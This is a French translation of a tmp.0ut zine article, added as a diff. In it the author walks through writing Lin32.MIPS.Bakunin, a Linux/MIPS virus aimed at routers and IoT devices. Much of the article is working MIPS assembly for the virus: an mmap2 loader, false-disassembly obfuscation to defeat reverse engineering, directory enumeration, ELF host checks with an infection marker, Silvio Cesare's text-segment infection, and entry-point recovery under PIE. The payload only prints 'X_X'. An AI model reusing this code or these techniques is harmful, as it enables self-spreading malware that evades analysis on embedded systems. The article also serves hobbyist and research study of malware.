@@ -1,0 +1,271 @@
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Ecrire Des Virus En Asm MIPS Pour Le Fun (Et Sans Profit)   │                   █   │
+~ S01den                                                    └───────────────────█ ──┘
+
+Délicieusement écrit par S01den, de l'équipe tmp.0ut !
+01/2021
+
++----------- Contact -----------+
+| twitter: @s01den              |
+| mail: S01den@protonmail.com   |
++-------------------------------+
+
+.---\ Introduction /---.
+
+Dans ce court(?) article, je vais vous expliquer comment j'ai écrit Lin32.MIPS.Bakunin[0], mon premier virus ciblant Linux/MIPS (comme les routeurs, les appareils IoT ou les consoles de jeux vidéo) en pur assembleur MIPS. Évidemment, je ne l'ai pas et ne le répandrai pas dans la nature. Ne faites pas non plus ce genre de chose stupide.
+
+J'ai utilisé quelques astuces amusantes que je veux développer ici, comme le calcul du point d'entrée original d'un hôte malgré le PIE, l'obfuscation de la partie principale du virus en bousillant l'alignement avec seulement quelques octets, et d'autres trucs sympa !
+
+Avant toute chose, résumons les caractéristiques de base de Bakunin :
+- Infection des fichiers ELF dans le répertoire courant, PIE ou non, grâce à la méthode d'infection de .text de Silvio Cesare[1] (modifier la définition du segment .text pour le rendre capable d'héberger le code du virus).
+- Utilise une technique simple mais puissante d'Anti Reverse-Engineering, le False-Disassembly[2].
+- Imprime "X_X" (charge utile vraiment géniale comme vous pouvez le voir)
+- C'était un grand philosophe anarchiste <-- Pas CE Bakunin...
+
+Maintenant que vous êtes motivés, nous pouvons commencer à creuser dans le code source de Lin32.MIPS.Bakunin !
+TW : Beaucoup de code MIPS sale. Prenez garde à vos yeux...
+
+.---\ Implémenter la technique de false-disassembly  /---.
+     \    en assembleur MIPS: Coder le Prologue     /
+
+Avant toute chose, je voudrais expliquer brièvement ce qu'est le false-disassembly.
+
+Cette technique anti-RE consiste simplement à bousiller l'alignement en codant en dur les premiers octets (ici, les 3 premiers octets) d'une instruction. Ainsi, le désassembleur va interpréter ces octets "fantômes" comme le début d'une instruction, et la compléter avec les premiers octets de l'instruction suivante. Cela perturbe tout l'alignement et peut rendre beaucoup d'instructions absurdes.
+
+Par exemple (ne provenant pas de mon virus) :
+-------------------- coupez-ici --------------------
+
+                          jmp hey+2 # to jump over the ghost bytes
+hey:                      hey:
+   xor %rbx, %rbx             .ascii "\x48\x31"
+   jmp yo            ====>     xor %rbx, %rbx
+                               jmp yo
+----------------------------------------------------
+
+Maintenant, si nous regardons le code désassemblé de ces deux instructions, nous aurions quelque chose comme ceci (radare2 ftw) :
+
+-------------------- coupez-ici --------------------
+;-- hey:
+0x00401002      4831db         xor rbx, rbx
+0x00401005      eb02           jmp 0x401009
+                          ||
+                          \/
+;-- hey:
+0x00401002      48314831       xor qword [rax + 0x31], rcx
+0x00401006      dbeb           fucomi st(3)
+0x00401008      026631         add ah, byte [rsi + 0x31]
+----------------------------------------------------
+
+C'est puissant pour l'architecture MIPS parce que toutes les instructions ont 4 octets, de sorte que les adresses des instructions sont alignées pour être un multiple de 4 (elles se terminent par 0x0, 0x4, 0x8 ou 0xc).
+
+Ainsi, nous n'avons même pas besoin de mettre des octets fantômes significatifs, nous pouvons mettre n'importe quel octet car l'alignement sera foutu de toute façon :
+
+0x004000b3                    unaligned
+0x004000b4      fc004003       invalid
+0x004000b8      a0182523       sb t8, 0x2523(zero)
+0x004000bc      bdf00003       cache 0x10, 3(t7)
+0x004000c0      a0202524       sb zero, 0x2524(at)
+0x004000c4      0500ff24       bltz t0, 0x3ffd58
+0x004000c8      02106b00       invalid
+0x004000cc      00000c03       sra at, zero, 0x10
+0x004000d0      a0202524       sb zero, 0x2524(at)
+0x004000d4      05000024       bltz t0, 0x400168
+                 ...
+
+Comme vous pouvez le constater, c'est de la merde :)
+
+Cependant, en assembleur MIPS on ne peut pas sauter n'importe où, on doit sauter sur une adresse multiple de 4 à cause de l'alignement.
+
+C'est pourquoi j'ai divisé le virus en deux parties : le prologue et le corps.
+
+Le prologue est constitué d'un syscall mmap2, préparant une zone exécutable en mémoire où nous copierons (grâce à la routine .get_vx qui suit) le code du corps, qui n'est pas aligné, pour pouvoir ensuite y sauter. En d'autres termes, nous rétablissons l'alignement pour pouvoir exécuter ces instructions.
+
+--= appelle le syscall mmap2 =--
+  # I didn't know how to pass more than 4 arguments (the registers $a0...$a3),
+  # so I made a simple program which use mmap(), I statically linked it
+  # and disassembled it to see how mmap was called, that's where I've got 
+  # the 3 following lines
+  sw  $zero,20($sp)
+  li  $v0,0
+  sw  $v0,16($sp)
+
+  li $a0, 0
+  li $a1, 0x6a8 # the full virus size
+  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
+  li $a3, 0x0802 # MAP_ANONYMOUS | MAP_PRIVATE
+  li $v0, 4210 # sys_mmap2
+  syscall
+------------------------------
+
+Cela signifie simplement :
+
+ mmap2(NULL, 0x6a8, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
+
+Une fois la zone de mémoire allouée, nous copions le code du corps du virus (après les faux octets).
+
+--= Copie du corps du virus =--
+  bgezal $zero, get_pc  # we grab the code by directly accessing the addresses of 
+                        # instructions
+  add $t1, $t1, 0x6f    # 0x6f = the number of bytes to reach the body,
+                        # now $t1 contains the addr of the body
+  move $t2, $v0         # $t2 now contains the addr we've just mmaped
+  li $t0, 0             # $t0 will be our counter
+
+  .get_vx:
+    lb $t3, 0($t1)      # we put the current grabbed byte into $t3
+    sb $t3, 0($t2)      # and we write this byte at the area pointed by $t2
+    addi $t0, $t0, 1
+    addi $t1, $t1, 1
+    addi $t2, $t2, 1
+    blt $t0, 0x615, .get_vx # there is 0x615 bytes in the body
+
+    jal $v0                 # jump to the mmaped region
+    beq $zero, $zero, eof   # the body will jump here after executing the payload
+
+  get_pc: # moving the saved eip (or pc in MIPS) in $t1
+    move $t1, $ra
+    jr $ra
+---------------------------------
+
+note : nous utilisons des instructions telles que beq ou bgezal car nous devons utiliser des sauts relatifs dans les virus (sinon ils ne fonctionneraient pas dans les binaires infectés) car les instructions de saut classiques (telles que j ou jal) sont absolues...
+
+La fin du prologue n'est constituée que d'un appel à sys_exit et d'un padding pour 9 instructions (la routine eof sera réécrite pendant l'infection par le code permettant de calculer l'OEP malgré le PIE), et par .ascii "\xeb\x01\xe8", les octets fantômes qui foutent en l'air l'alignement du code du corps.
+
+
+.---\ Infecter tout le répertoire: Coder le Corps /---.
+
+Maintenant que nous sommes dans le corps, nous pouvons faire les trucs classiques des virus.
+
+Pour pouvoir infecter des binaires, un virus doit récupérer la liste des hôtes potentiels dans le répertoire courant.
+
+Nous obtenons d'abord le nom du répertoire courant grâce à un appel sys_getcwd, puis nous pouvons l'ouvrir grâce à un appel sys_open.
+
+Une fois le répertoire ouvert, nous utilisons l'appel sys_getdents64 pour obtenir une structure contenant les noms des fichiers présents dans le répertoire.
+
+Nous l'analysons simplement avec la routine suivante :
+
+--= Parser la structure dirent =--
+li $s0, 0 # s0 will be our counter
+parse_dir:
+  move $s2, $sp # s2 will contain the address of the filename
+  addi $s2, $s2, 0x13 # d_name
+
+  li $t1, 0
+  addi $t1, $sp, 0x12
+  lb $t1, 0($t1) # t1 now contains the type of the entry (file or dir)
+
+  bgezal $zero, infect
+  li $t9, 0
+
+  # get d_reclen (see the organization of the dirent64 structure...)
+  addi $t9, $sp, 0x10
+  lb $t0, 1($t9)
+
+  # buffer position += d_reclen
+  add $s0, $s0, $t0
+
+  add $sp, $sp, $t0
+
+  blt $s0, $s1, parse_dir # if counter < nbr of entries : jmp to parse_dir
+------------------------------------
+
+Ensuite, on ouvre chaque fichier puis on les mappe comme çà :
+mmap2(NULL, len_file, PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0)
+
+et nous vérifions s'ils peuvent accueillir le virus :
+
+--= Quelques vérifs =--
+# $s5 contains the addr of the mmaped area
+
+.check_magic:
+  lw $t0, 0($s5)
+  li $t1, 0x7f454c46 # check if the file is an ELF (by checking the magic bytes)
+  bne $t0, $t1, end
+
+.check_bits:
+  lb $t0, 4($s5)
+  bne $t0, 1, end # here, we check e_ident[EI_CLASS], to know if the ELF we're 
+                  # trying to infect is 32 or 64 bit (if it's 64 bit, goto end)
+
+.check_signature:
+  lw $t0, 9($s5)  # the signature is located in e_hdr.padding, such as in 
+                  # Lin64.Kropotkine[3]
+  beq $t0, 0xdeadc0de, end
+----------------------
+
+Ensuite nous pouvons infecter le fichier.
+Nous utilisons la technique d'infection de Silvio :
+
+"Pour insérer du code à la fin du segment de texte il nous reste à faire.
+    * Augmenter p_shoff pour tenir compte du nouveau code dans l'en-tête ELF
+    * Localiser l'en-tête de programme du segment :text
+      * Augmenter p_filesz pour tenir compte du nouveau code.
+      * Augmentez p_memsz pour tenir compte du nouveau code.
+    * Pour chaque phdr après le segment d'insertion (segment :text)
+      * augmenter p_offset pour tenir compte de la nouvelle position après l'insertion
+    * Pour chaque shdr après le segment d'insertion
+      * Augmenter sh_offset pour tenir compte du nouveau code
+    * Insérer physiquement le nouveau code dans le fichier - p_offset du segment .text
+      + p_filesz (original)"[1]
+
+La routine d'infection est assez longue et largement commentée, je ne vais donc pas expliquer ici le code point par point.
+
+Gardez juste à l'esprit que nous devons d'abord écrire le prologue. Parce que nous sommes dans la zone mmapée, nous ne pouvons pas le saisir comme nous l'avons fait pour le corps (parce que le prologue n'est pas dans la zone mmapée), alors je l'ai codé en dur... (voir les lignes 366 à 446)
+
+Après avoir copié le prologue codé en dur, nous écrivons le code (en dur aussi) pour calculer l'OEP. J'ai utilisé la même méthode que dans mon Lin64.Kropotkine[3], (la technique d'Elf_master pour résoudre l'OEP dans un PIE[4]).
+
+Elle consiste simplement à faire cette opération :
+
+  get_rip() - nombre_d_octets_avant - nouveau_EP + original_EP-e_hdr.entry
+
+Voici le code MIPS pour faire ce calcul :
+
+------------------- le code pour hardcoder -------------------
+ 0411fff5       bal get_pc
+ 00000000       nop
+ 2129fc70       addi t1, t1, -0x74 # substract the number of bytes before 
+                                   # this instruction
+ 3401dead       ori at, zero, new_EP
+ 01214822       sub t1, t1, at
+ 2129beef       addi t1, t1, OEP
+ 0060e825       move sp, v1        # restore the original stack
+ 01200008       jr t1              # jump to the computed OEP
+--------------------------------------------------------------
+
+Ensuite, nous pouvons écrire le corps dans l'hôte, appliquer les changements (avec sys_msync et sys_munmap) et enfin fermer le fichier, pour essayer d'en infecter un autre.
+
+Après avoir infecté tout le répertoire, nous exécutons simplement la charge utile ("X_X") et nous sortons enfin !
+
+.---\ Conclusion /---.
+
+J'espère que vous avez apprécié cet article ! J'ai beaucoup appris en écrivant ce virus, je n'avais jamais rien écrit en assembleur MIPS auparavant...
+
+J'espère que vous avez appris autant que moi en travaillant sur ce virus pendant deux mois.
+
+.---\ Notes et références /---.
+[0] L'emplacement du code source
+[1] Les articles de Silvio sur l'infection
+    http://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix02.htm
+[2] http://www.ouah.org/linux-anti-debugging.txt
+[3] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[4] https://bitlackeys.org/papers/pocorgtfo20.pdf
+...
+
+--- Source ---
+
+- Linux.Bak0unin.asm (Voir le fichier dans txt/)
